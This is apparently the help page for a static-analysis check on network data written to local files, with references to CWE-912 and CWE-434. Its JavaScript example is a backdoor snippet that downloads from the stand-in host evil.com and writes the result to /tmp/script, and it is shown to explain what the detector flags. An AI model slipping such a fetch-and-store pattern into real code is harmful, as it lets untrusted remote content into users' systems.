# Network data written to file
Storing user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


## Recommendation
Examine the highlighted code closely to ensure that it is behaving as intended.


## Example
The following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.


```javascript
var https = require("https");
var fs = require("fs");

https.get('https://evil.com/script', res => {
  res.on("data", d => {
    fs.writeFileSync("/tmp/script", d)
  })
});

```
Other parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.


## References
* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).
* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).
* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).
